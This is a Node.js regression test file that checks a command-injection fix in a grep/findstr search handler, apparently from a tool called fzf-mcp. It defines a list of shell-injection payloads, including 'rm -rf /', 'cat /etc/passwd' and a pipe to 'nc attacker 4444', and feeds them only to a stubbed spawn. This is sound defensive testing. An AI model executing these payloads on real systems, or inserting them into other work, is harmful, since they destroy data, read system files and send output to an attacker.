/**
 * Regression tests for the command-injection fix in fuzzy_search_content.
 *
 * Background: commit d8c81e5 ("fix(security): patch command injection in
 * fuzzy_search_content (1.1.2)"). Before that commit the handler built
 *   findstr /s /n /p "${query}" "${directory}\\${filePattern}" 2>nul
 *   grep -r ${caseFlag} -n "${query}" "${directory}" 2>/dev/null
 * via string interpolation and passed it to `exec`. A query like
 *   "; calc.exe & echo "          (Windows)
 *   "; rm -rf ~ #                  (Unix)
 * would escape the quoting and execute attacker-controlled commands.
 *
 * The fix routes the search through `runSearchCommand`, which calls
 * `child_process.spawn(cmd, args, { shell: false })` with each user-
 * supplied value as a separate argv item.
 *
 * These tests pin the safe call shape: the user's query/directory/
 * filePattern flow into `args` as their own elements (never concatenated)
 * and `runSearchCommand` always spawns with `shell: false` and an array
 * argv (never a single shell string).
 */

const test = require("node:test");
const assert = require("node:assert/strict");
const path = require("node:path");
const Module = require("node:module");

// Stub child_process.spawn BEFORE requiring index.js so the module sees the
// stubbed function via require-cache. We capture every spawn invocation for
// later assertion.
const spawnCalls = [];
const fakeChildProcess = makeFakeChildProcess();

const realResolve = Module._resolveFilename;
const realLoad = Module._load;
Module._load = function (request, parent, ...rest) {
  if (request === "child_process") return fakeChildProcess;
  return realLoad.call(this, request, parent, ...rest);
};

const { buildContentSearchCommand, runSearchCommand } = require("../index.js");

// Restore the loader so unrelated requires aren't shadowed during teardown.
Module._load = realLoad;

function makeFakeChildProcess() {
  return {
    spawn(cmd, args, options) {
      spawnCalls.push({ cmd, args, options });
      // Minimal EventEmitter-like stub. Resolves immediately with empty stdout.
      const listeners = { close: [], error: [], data: [] };
      const proc = {
        stdout: {
          on(evt, cb) {
            if (evt === "data") listeners.data.push(cb);
          },
        },
        stderr: { on() {} },
        on(evt, cb) {
          if (listeners[evt]) listeners[evt].push(cb);
          if (evt === "close") {
            // Defer so the caller can wire up listeners first.
            setImmediate(() => cb(0));
          }
        },
      };
      return proc;
    },
  };
}

// Battery of injection payloads that historically would have escaped the
// double-quoted shell string in the pre-1.1.2 implementation.
const INJECTION_PAYLOADS = [
  // Windows-style: close the quote, chain calc.exe, swallow trailing text.
  '"; calc.exe & echo "',
  // POSIX-style: rm -rf with comment to swallow trailing quote.
  '"; rm -rf ~ #',
  // && / || chaining.
  "foo && cat /etc/passwd",
  "foo || whoami",
  // Pipe-to-attacker.
  "foo | nc attacker 4444",
  // Subshell / command substitution.
  "$(whoami)",
  "`whoami`",
  "${PATH}",
  // Backtick / dollar-paren wrappers around the query as a whole.
  '`rm -rf /`',
  // Newline injection (CRLF and LF).
  "foo\nrm -rf /",
  "foo\r\ncalc.exe",
  // Glob expansion attempt — fzf-mcp passes this to findstr/grep as a
  // literal pattern, never through a shell, so glob expansion does NOT
  // happen. The test asserts that.
  "*",
  "*.js",
  // Null byte (truncation attack on naive C parsers).
  "foo\x00rm -rf /",
];

// Legitimate inputs that should still work — filenames with spaces, unicode,
// dashes that look like flags.
const LEGITIMATE_QUERIES = [
  "TODO",
  "Hello World",
  "café",
  "naïve",
  // Dash-prefixed query is the riskiest legitimate input — argv parsers may
  // mistake it for a flag. fzf-mcp's `findstr/grep` invocations use the
  // pattern as a positional arg AFTER `/p` or `-n`, so a dash-prefixed
  // pattern just becomes the search string.
  "-foo",
  "--bar",
  // Path-like queries.
  "src/index.js",
];

// ── buildContentSearchCommand: argv-shape invariants ───────────────────────

test("buildContentSearchCommand: linux passes query as its own argv element", () => {
  for (const payload of INJECTION_PAYLOADS) {
    const { cmd, args } = buildContentSearchCommand(
      { query: payload, directory: "/tmp", filePattern: "*" },
      "linux"
    );
    assert.equal(cmd, "grep", "must always invoke grep on linux");
    // The query MUST appear as a single argv element, character-for-
    // character. Nothing escaped, nothing concatenated. That's what
    // makes shell metacharacters into literal pattern text.
    assert.ok(
      args.includes(payload),
      `payload ${JSON.stringify(payload)} not found as argv element in ${JSON.stringify(args)}`
    );
    // Spot-check: no element is a multi-word shell string with the
    // payload spliced inside.
    for (const a of args) {
      if (a !== payload && a.includes(payload)) {
        throw new Error(
          `payload was concatenated into argv element ${JSON.stringify(a)}`
        );
      }
    }
  }
});

test("buildContentSearchCommand: win32 passes query as its own argv element", () => {
  for (const payload of INJECTION_PAYLOADS) {
    const { cmd, args } = buildContentSearchCommand(
      { query: payload, directory: "C:\\proj", filePattern: "*.js" },
      "win32"
    );
    assert.equal(cmd, "findstr");
    assert.ok(
      args.includes(payload),
      `payload ${JSON.stringify(payload)} not found as argv element in ${JSON.stringify(args)}`
    );
  }
});

test("buildContentSearchCommand: directory is passed as a separate argv element", () => {
  // Directory path with a malicious-looking suffix. Must not get spliced
  // into the query argv slot.
  const dir = "/tmp/evil; rm -rf /";
  const { args } = buildContentSearchCommand(
    { query: "TODO", directory: dir, filePattern: "*" },
    "linux"
  );
  // grep gets directory as its own positional arg.
  assert.ok(args.includes(dir), "directory must be its own argv element");
  // And nothing in args concatenates it onto another value.
  for (const a of args) {
    if (a !== dir && a.includes(dir)) {
      throw new Error(`directory was concatenated into ${JSON.stringify(a)}`);
    }
  }
});

test("buildContentSearchCommand: legitimate inputs still pass through", () => {
  for (const q of LEGITIMATE_QUERIES) {
    for (const platform of ["linux", "win32"]) {
      const { cmd, args } = buildContentSearchCommand(
        { query: q, directory: ".", filePattern: "*" },
        platform
      );
      assert.ok(cmd === "grep" || cmd === "findstr");
      assert.ok(
        args.includes(q),
        `query ${JSON.stringify(q)} not preserved on ${platform}`
      );
    }
  }
});

test("buildContentSearchCommand: caseSensitive=false on linux adds -i", () => {
  const { args } = buildContentSearchCommand(
    { query: "x", directory: ".", caseSensitive: false },
    "linux"
  );
  assert.ok(args.includes("-i"));
});

test("buildContentSearchCommand: caseSensitive=true on linux omits -i", () => {
  const { args } = buildContentSearchCommand(
    { query: "x", directory: ".", caseSensitive: true },
    "linux"
  );
  assert.ok(!args.includes("-i"));
});

test("buildContentSearchCommand: filePattern is path.join'd onto directory on win32", () => {
  const { args } = buildContentSearchCommand(
    { query: "x", directory: "C:\\proj", filePattern: "*.js" },
    "win32"
  );
  // The combined path is exactly path.join's output — no shell quoting.
  assert.ok(args.includes(path.join("C:\\proj", "*.js")));
});

// ── runSearchCommand: spawn shape invariants ───────────────────────────────

test("runSearchCommand always uses spawn with shell:false and array argv", async () => {
  spawnCalls.length = 0;

  // Run a battery of payloads through the full code path.
  for (const payload of INJECTION_PAYLOADS) {
    const { cmd, args } = buildContentSearchCommand(
      { query: payload, directory: "/tmp", filePattern: "*" },
      "linux"
    );
    await runSearchCommand(cmd, args);
  }

  // EVERY spawn call must satisfy the safe-shape contract.
  assert.ok(spawnCalls.length === INJECTION_PAYLOADS.length);
  for (const call of spawnCalls) {
    // Critical: shell must NOT be true. The fix's core invariant.
    assert.notEqual(
      call.options && call.options.shell,
      true,
      "spawn must NEVER be called with shell:true"
    );
    // Args must be an array, never a string. A string args param to spawn
    // (combined with shell:true) is the unsafe form.
    assert.ok(Array.isArray(call.args), "args must be an array");
    // First argument (cmd) must be a bare command, not a shell string with
    // metacharacters spliced into it.
    assert.ok(
      typeof call.cmd === "string" && !/[;&|`$<>]/.test(call.cmd),
      `cmd looks like a shell string: ${JSON.stringify(call.cmd)}`
    );
  }
});

test("runSearchCommand resolves with stdout+code shape", async () => {
  const result = await runSearchCommand("grep", ["-r", "-n", "TODO", "."]);
  assert.equal(typeof result.stdout, "string");
  assert.equal(typeof result.code, "number");
});

// ── Documentation test: the unsafe form would have failed this ─────────────

test("the pre-fix shell-string form is NOT used anywhere in the build helper", () => {
  // Sanity check: buildContentSearchCommand must NEVER return args
  // containing characters that only matter inside a shell string.
  // Specifically, no argv element should be a quoted-and-concatenated
  // composite (e.g. `"foo" "bar"`), and no element should be the literal
  // string `2>nul` or `2>/dev/null` (those were appended in the unsafe form).
  for (const platform of ["linux", "win32"]) {
    const { args } = buildContentSearchCommand(
      { query: "TODO", directory: ".", filePattern: "*" },
      platform
    );
    for (const a of args) {
      assert.ok(
        !a.includes("2>nul") && !a.includes("2>/dev/null"),
        `redirection token leaked into argv: ${JSON.stringify(a)}`
      );
      // No argv element should contain unescaped double-quotes from a
      // shell-string template (e.g. `"TODO"`).
      assert.ok(
        !(a.startsWith('"') && a.endsWith('"') && a.length > 1),
        `argv element looks like a shell-quoted string: ${JSON.stringify(a)}`
      );
    }
  }
});
